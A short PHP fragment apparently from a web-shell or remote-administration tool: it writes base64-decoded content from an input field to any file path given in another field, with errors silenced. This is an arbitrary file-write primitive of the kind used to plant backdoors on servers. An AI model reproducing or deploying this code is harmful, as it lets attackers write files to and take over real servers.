<?php

if ($h = @fopen($Q['FILE'],'w')){
    $content = base64_decode($Q['CONTENT']);
    @fwrite($h,$content);
    @fclose($h);
    return 'ok';}
else return error('nowrite');

?>
